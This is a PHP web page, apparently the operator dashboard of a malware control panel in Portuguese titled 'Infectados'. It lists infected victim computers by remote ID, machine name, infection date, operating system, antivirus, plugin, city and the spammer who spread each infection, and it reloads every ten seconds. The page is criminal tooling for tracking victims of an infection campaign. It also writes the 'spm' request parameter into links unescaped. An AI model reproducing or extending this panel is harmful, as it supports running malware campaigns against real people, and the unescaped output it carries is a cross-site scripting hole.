<?php require_once("funcoes.php");?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Infectados - <?php echo contarTotal();?></title>
    <link rel="stylesheet" href="css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css"></link>
</head>
<body>

    <div id="principal" class="container">
        <div id="iniciodetudo" class="container">
            <div class="col-sm-12 center">
                <img id="logo" src="imgs/logo.png">
				
				<p>&nbsp;</p>
				<a class="link" href="<?php echo $_SERVER['PHP_SELF'];?>?pag=Lista_Todos_Infectados">( <?php echo contarTotal(); ?> - Total )</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                <?php
                    $data = ShowSpmmr();
                    foreach ($data as $value) {
                        echo "<a class='link' href=".$_SERVER['PHP_SELF']."?pag=Lista_Por_Spammer&spm=".$value.">(".contarOcorrencias($value)." - ".$value." )</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
                    }
                ?>
				
            </div>
        </div>
		
		<div class="row">
            <div class="col-sm-12">
                <?php
                    if(!isset($_GET['pag']) || (isset($_GET['pag']) && $_GET['pag'] == "Lista_Todos_Infectados")):
                ?>
				<p>&nbsp;</p>	
                <table>
                    <thead>
                        <tr>
                            <th width="2%" class="center">ID</th>
                            <th width="2%" class="center">id Remoto</th>
                            <th width="7%" class="center">Computador</th>
                            <th width="6%" class="center">Dia da Infecção</th>
                            <th width="3%" class="center">Sistema Operacional</th>
                            <th width="4%" class="center">Antivirus</th>
                            <th width="5%" class="center">Plugin</th>
                            <th width="5%" class="center">Cidade</th>
			                <th width="5%" class="center">Spammer</th>

                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    $file = file($arquivoContador);
                    $file = array_unique($file);
                    $contador = 1;
                    foreach($file as $f):
                    $data = explode("|", $f);
                    $bloqueado = trim($data[16]) == "BLOQUEADO" ? true : false;		
					$verde_infectado = "v3rd3_infekt";	
					     ?>
                         <tr class="<?php echo $verde_infectado ? "v3rd3_infekt" : "" ?>">
                            <td class="center"><?php echo $contador;?></td>
                            <td class="center"><?php echo trim($data[0]);?></td>
                            <td class="center"><?php echo trim($data[1]);?></td>
                            <td class="center"><?php echo trim($data[2]);?></td>
                            <td class="center"><?php echo trim($data[3]);?></td>
                            <td class="center"><?php echo trim($data[4]);?></td>
                            <td class="center"><?php echo trim($data[5]);?></td>
                            <td class="center"><?php echo trim($data[6]);?></td>
							<td class="center"><?php echo trim($data[7]);?></td>
                         </tr>						
                        <?php
                    $contador++;
                    endforeach;
                    ?>
                    </tbody>
                </table>
                <?php
                endif;
                ?>
            </div>
        </div>
		
		<div class="row">
            <div class="col-sm-12">
                <?php
                    if(!isset($_GET['pag']) || (isset($_GET['pag']) && $_GET['pag'] == "Lista_Por_Spammer")):
                ?>
				<p>&nbsp;</p>	
                <table>
                    <thead>
                        <tr>
                            <th width="2%" class="center">ID</th>
                            <th width="2%" class="center">id Remoto</th>
                            <th width="7%" class="center">Computador</th>
                            <th width="6%" class="center">Dia da Infecção</th>
                            <th width="3%" class="center">Sistema Operacional</th>
                            <th width="4%" class="center">Antivirus</th>
                            <th width="5%" class="center">Plugin</th>
                            <th width="5%" class="center">Cidade</th>
            			    <th width="5%" class="center">Spammer</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    $file = list_per_spammer($_GET['spm']);
                    $file = array_unique($file);
                    $contador = 1;
                    foreach($file as $f):
                    $data = explode("|", $f);
                   
						$verde_infectado = "v3rd3_infekt";	
					     ?>
                            <tr class="<?php echo $verde_infectado ? "v3rd3_infekt" : "" ?>">
                            <td class="center"><?php echo $contador;?></td>
                            <td class="center"><?php echo trim($data[0]);?></td>
                            <td class="center"><?php echo trim($data[1]);?></td>
                            <td class="center"><?php echo trim($data[2]);?></td>
                            <td class="center"><?php echo trim($data[3]);?></td>
                            <td class="center"><?php echo trim($data[4]);?></td>
                            <td class="center"><?php echo trim($data[5]);?></td>
                            <td class="center"><?php echo trim($data[6]);?></td>
							<td class="center"><?php echo trim($data[7]);?></td>
                         </tr>						
                        <?php

                    $contador++;
                    endforeach;
                    ?>
                    </tbody>
                </table>
                <?php
                endif;
                ?>
            </div>
        </div>
					
    </div>
    <script>
    
       setInterval(() => {
        location.reload();
       }, 10000);
    </script>
</body>
</html>